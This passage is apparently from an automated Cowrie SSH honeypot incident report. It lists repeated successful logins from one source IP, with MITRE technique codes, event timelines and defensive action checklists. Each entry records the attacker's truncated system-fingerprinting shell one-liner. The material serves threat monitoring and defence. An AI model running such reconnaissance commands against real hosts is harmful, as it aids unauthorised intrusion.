| `2026-08-26 15:30:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.147.232[.]237` to AbuseIPDB if not already reported
- [ ] Block `23.147.232[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c378beb092a1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:30 |
| **Last Seen** | 2026-08-26 15:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:30:14` | `cowrie.session.connect` |
| `2026-08-26 15:30:15` | `cowrie.client.version` |
| `2026-08-26 15:30:15` | `cowrie.client.kex` |
| `2026-08-26 15:30:17` | `cowrie.login.success` |
| `2026-08-26 15:30:18` | `cowrie.session.params` |
| `2026-08-26 15:30:18` | `cowrie.command.input` |
| `2026-08-26 15:30:18` | `cowrie.command.input` |
| `2026-08-26 15:30:18` | `cowrie.command.input` |
| `2026-08-26 15:30:18` | `cowrie.command.input` |
| `2026-08-26 15:30:18` | `cowrie.command.input` |
| `2026-08-26 15:30:18` | `cowrie.command.success` |
| `2026-08-26 15:30:18` | `cowrie.command.input` |
| `2026-08-26 15:30:18` | `cowrie.command.input` |
| `2026-08-26 15:30:18` | `cowrie.command.input` |
| `2026-08-26 15:30:18` | `cowrie.command.input` |
| `2026-08-26 15:30:19` | `cowrie.log.closed` |
| `2026-08-26 15:30:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e8f6290faac

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:31 |
| **Last Seen** | 2026-08-26 15:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:31:51` | `cowrie.session.connect` |
| `2026-08-26 15:31:51` | `cowrie.client.version` |
| `2026-08-26 15:31:51` | `cowrie.client.kex` |
| `2026-08-26 15:31:53` | `cowrie.login.success` |
| `2026-08-26 15:31:54` | `cowrie.session.params` |
| `2026-08-26 15:31:54` | `cowrie.command.input` |
| `2026-08-26 15:31:54` | `cowrie.command.input` |
| `2026-08-26 15:31:54` | `cowrie.command.input` |
| `2026-08-26 15:31:54` | `cowrie.command.input` |
| `2026-08-26 15:31:54` | `cowrie.command.input` |
| `2026-08-26 15:31:54` | `cowrie.command.success` |
| `2026-08-26 15:31:54` | `cowrie.command.input` |
| `2026-08-26 15:31:54` | `cowrie.command.input` |
| `2026-08-26 15:31:54` | `cowrie.command.input` |
| `2026-08-26 15:31:54` | `cowrie.command.input` |
| `2026-08-26 15:31:54` | `cowrie.log.closed` |
| `2026-08-26 15:31:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0460ded22db2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:33 |
| **Last Seen** | 2026-08-26 15:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:33:57` | `cowrie.session.connect` |
| `2026-08-26 15:33:57` | `cowrie.client.version` |
| `2026-08-26 15:33:57` | `cowrie.client.kex` |
| `2026-08-26 15:33:57` | `cowrie.login.success` |
| `2026-08-26 15:33:58` | `cowrie.session.params` |
| `2026-08-26 15:33:58` | `cowrie.command.input` |
| `2026-08-26 15:33:58` | `cowrie.command.input` |
| `2026-08-26 15:33:58` | `cowrie.command.input` |
| `2026-08-26 15:33:58` | `cowrie.command.input` |
| `2026-08-26 15:33:58` | `cowrie.command.input` |
| `2026-08-26 15:33:58` | `cowrie.command.success` |
| `2026-08-26 15:33:58` | `cowrie.command.input` |
| `2026-08-26 15:33:58` | `cowrie.command.input` |
| `2026-08-26 15:33:58` | `cowrie.command.input` |
| `2026-08-26 15:33:58` | `cowrie.command.input` |
| `2026-08-26 15:33:59` | `cowrie.log.closed` |
| `2026-08-26 15:33:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b51eeaf97a4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:37 |
| **Last Seen** | 2026-08-26 15:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:37:33` | `cowrie.session.connect` |
| `2026-08-26 15:37:33` | `cowrie.client.version` |
| `2026-08-26 15:37:33` | `cowrie.client.kex` |
| `2026-08-26 15:37:33` | `cowrie.login.success` |
| `2026-08-26 15:37:34` | `cowrie.session.params` |
| `2026-08-26 15:37:34` | `cowrie.command.input` |
| `2026-08-26 15:37:34` | `cowrie.command.input` |
| `2026-08-26 15:37:34` | `cowrie.command.input` |
| `2026-08-26 15:37:34` | `cowrie.command.input` |
| `2026-08-26 15:37:34` | `cowrie.command.input` |
| `2026-08-26 15:37:34` | `cowrie.command.success` |
| `2026-08-26 15:37:34` | `cowrie.command.input` |
| `2026-08-26 15:37:34` | `cowrie.command.input` |
| `2026-08-26 15:37:34` | `cowrie.command.input` |
| `2026-08-26 15:37:34` | `cowrie.command.input` |
| `2026-08-26 15:37:34` | `cowrie.log.closed` |
| `2026-08-26 15:37:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c17f58b519e1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:39 |
| **Last Seen** | 2026-08-26 15:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:39:36` | `cowrie.session.connect` |
| `2026-08-26 15:39:36` | `cowrie.client.version` |
| `2026-08-26 15:39:36` | `cowrie.client.kex` |
| `2026-08-26 15:39:38` | `cowrie.login.success` |
| `2026-08-26 15:39:39` | `cowrie.session.params` |
| `2026-08-26 15:39:39` | `cowrie.command.input` |
| `2026-08-26 15:39:39` | `cowrie.command.input` |
| `2026-08-26 15:39:39` | `cowrie.command.input` |
| `2026-08-26 15:39:39` | `cowrie.command.input` |
| `2026-08-26 15:39:39` | `cowrie.command.input` |
| `2026-08-26 15:39:39` | `cowrie.command.success` |
| `2026-08-26 15:39:39` | `cowrie.command.input` |
| `2026-08-26 15:39:39` | `cowrie.command.input` |
| `2026-08-26 15:39:39` | `cowrie.command.input` |
| `2026-08-26 15:39:39` | `cowrie.command.input` |
| `2026-08-26 15:39:39` | `cowrie.log.closed` |
| `2026-08-26 15:39:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c34d724b89c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:41 |
| **Last Seen** | 2026-08-26 15:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:41:23` | `cowrie.session.connect` |
| `2026-08-26 15:41:23` | `cowrie.client.version` |
| `2026-08-26 15:41:23` | `cowrie.client.kex` |
| `2026-08-26 15:41:24` | `cowrie.login.success` |
| `2026-08-26 15:41:25` | `cowrie.session.params` |
| `2026-08-26 15:41:25` | `cowrie.command.input` |
| `2026-08-26 15:41:25` | `cowrie.command.input` |
| `2026-08-26 15:41:25` | `cowrie.command.input` |
| `2026-08-26 15:41:25` | `cowrie.command.input` |
| `2026-08-26 15:41:25` | `cowrie.command.input` |
| `2026-08-26 15:41:25` | `cowrie.command.success` |
| `2026-08-26 15:41:25` | `cowrie.command.input` |
| `2026-08-26 15:41:25` | `cowrie.command.input` |
| `2026-08-26 15:41:25` | `cowrie.command.input` |
| `2026-08-26 15:41:25` | `cowrie.command.input` |
| `2026-08-26 15:41:25` | `cowrie.log.closed` |
| `2026-08-26 15:41:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4e9471bfdda

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:43 |
| **Last Seen** | 2026-08-26 15:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:43:34` | `cowrie.session.connect` |
| `2026-08-26 15:43:34` | `cowrie.client.version` |
| `2026-08-26 15:43:34` | `cowrie.client.kex` |
| `2026-08-26 15:43:34` | `cowrie.login.success` |
| `2026-08-26 15:43:35` | `cowrie.session.params` |
| `2026-08-26 15:43:35` | `cowrie.command.input` |
| `2026-08-26 15:43:35` | `cowrie.command.input` |
| `2026-08-26 15:43:35` | `cowrie.command.input` |
| `2026-08-26 15:43:35` | `cowrie.command.input` |
| `2026-08-26 15:43:35` | `cowrie.command.input` |
| `2026-08-26 15:43:35` | `cowrie.command.success` |
| `2026-08-26 15:43:35` | `cowrie.command.input` |
| `2026-08-26 15:43:35` | `cowrie.command.input` |
| `2026-08-26 15:43:35` | `cowrie.command.input` |
| `2026-08-26 15:43:35` | `cowrie.command.input` |
| `2026-08-26 15:43:35` | `cowrie.log.closed` |
| `2026-08-26 15:43:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f5dd493e88a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:47 |
| **Last Seen** | 2026-08-26 15:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:47:40` | `cowrie.session.connect` |
| `2026-08-26 15:47:40` | `cowrie.client.version` |
| `2026-08-26 15:47:40` | `cowrie.client.kex` |
| `2026-08-26 15:47:41` | `cowrie.login.success` |
| `2026-08-26 15:47:41` | `cowrie.session.params` |
| `2026-08-26 15:47:41` | `cowrie.command.input` |
| `2026-08-26 15:47:41` | `cowrie.command.input` |
| `2026-08-26 15:47:41` | `cowrie.command.input` |
| `2026-08-26 15:47:41` | `cowrie.command.input` |
| `2026-08-26 15:47:41` | `cowrie.command.input` |
| `2026-08-26 15:47:41` | `cowrie.command.success` |
| `2026-08-26 15:47:41` | `cowrie.command.input` |
| `2026-08-26 15:47:41` | `cowrie.command.input` |
| `2026-08-26 15:47:41` | `cowrie.command.input` |
| `2026-08-26 15:47:41` | `cowrie.command.input` |
| `2026-08-26 15:47:42` | `cowrie.log.closed` |
| `2026-08-26 15:47:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d7380404a0a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:50 |
| **Last Seen** | 2026-08-26 15:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:50:19` | `cowrie.session.connect` |
| `2026-08-26 15:50:19` | `cowrie.client.version` |
| `2026-08-26 15:50:19` | `cowrie.client.kex` |
| `2026-08-26 15:50:19` | `cowrie.login.success` |
| `2026-08-26 15:50:21` | `cowrie.session.params` |
| `2026-08-26 15:50:21` | `cowrie.command.input` |
| `2026-08-26 15:50:21` | `cowrie.command.input` |
| `2026-08-26 15:50:21` | `cowrie.command.input` |
| `2026-08-26 15:50:21` | `cowrie.command.input` |
| `2026-08-26 15:50:21` | `cowrie.command.input` |
| `2026-08-26 15:50:21` | `cowrie.command.success` |
| `2026-08-26 15:50:21` | `cowrie.command.input` |
| `2026-08-26 15:50:21` | `cowrie.command.input` |
| `2026-08-26 15:50:21` | `cowrie.command.input` |
| `2026-08-26 15:50:21` | `cowrie.command.input` |
| `2026-08-26 15:50:21` | `cowrie.log.closed` |
| `2026-08-26 15:50:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-394dbb636cf2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:52 |
| **Last Seen** | 2026-08-26 15:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:52:27` | `cowrie.session.connect` |
| `2026-08-26 15:52:27` | `cowrie.client.version` |
| `2026-08-26 15:52:27` | `cowrie.client.kex` |
| `2026-08-26 15:52:28` | `cowrie.login.success` |
| `2026-08-26 15:52:29` | `cowrie.session.params` |
| `2026-08-26 15:52:29` | `cowrie.command.input` |
| `2026-08-26 15:52:29` | `cowrie.command.input` |
| `2026-08-26 15:52:29` | `cowrie.command.input` |
| `2026-08-26 15:52:29` | `cowrie.command.input` |
| `2026-08-26 15:52:29` | `cowrie.command.input` |
| `2026-08-26 15:52:29` | `cowrie.command.success` |
| `2026-08-26 15:52:29` | `cowrie.command.input` |
| `2026-08-26 15:52:29` | `cowrie.command.input` |
| `2026-08-26 15:52:29` | `cowrie.command.input` |
| `2026-08-26 15:52:29` | `cowrie.command.input` |
| `2026-08-26 15:52:29` | `cowrie.log.closed` |
| `2026-08-26 15:52:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7ade184908a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:55 |
| **Last Seen** | 2026-08-26 15:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:55:17` | `cowrie.session.connect` |
| `2026-08-26 15:55:17` | `cowrie.client.version` |
| `2026-08-26 15:55:17` | `cowrie.client.kex` |
| `2026-08-26 15:55:17` | `cowrie.login.success` |
| `2026-08-26 15:55:18` | `cowrie.session.params` |
| `2026-08-26 15:55:18` | `cowrie.command.input` |
| `2026-08-26 15:55:18` | `cowrie.command.input` |
| `2026-08-26 15:55:18` | `cowrie.command.input` |
| `2026-08-26 15:55:18` | `cowrie.command.input` |
| `2026-08-26 15:55:18` | `cowrie.command.input` |
| `2026-08-26 15:55:18` | `cowrie.command.success` |
| `2026-08-26 15:55:18` | `cowrie.command.input` |
| `2026-08-26 15:55:18` | `cowrie.command.input` |
| `2026-08-26 15:55:18` | `cowrie.command.input` |
| `2026-08-26 15:55:18` | `cowrie.command.input` |
| `2026-08-26 15:55:18` | `cowrie.log.closed` |
| `2026-08-26 15:55:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e020f2ad221

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 15:58 |
| **Last Seen** | 2026-08-26 15:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 15:58:39` | `cowrie.session.connect` |
| `2026-08-26 15:58:39` | `cowrie.client.version` |
| `2026-08-26 15:58:39` | `cowrie.client.kex` |
| `2026-08-26 15:58:39` | `cowrie.login.success` |
| `2026-08-26 15:58:40` | `cowrie.session.params` |
| `2026-08-26 15:58:40` | `cowrie.command.input` |
| `2026-08-26 15:58:40` | `cowrie.command.input` |
| `2026-08-26 15:58:40` | `cowrie.command.input` |
| `2026-08-26 15:58:40` | `cowrie.command.input` |
| `2026-08-26 15:58:40` | `cowrie.command.input` |
| `2026-08-26 15:58:40` | `cowrie.command.success` |
| `2026-08-26 15:58:40` | `cowrie.command.input` |
| `2026-08-26 15:58:40` | `cowrie.command.input` |
| `2026-08-26 15:58:40` | `cowrie.command.input` |
| `2026-08-26 15:58:40` | `cowrie.command.input` |
| `2026-08-26 15:58:40` | `cowrie.log.closed` |
| `2026-08-26 15:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
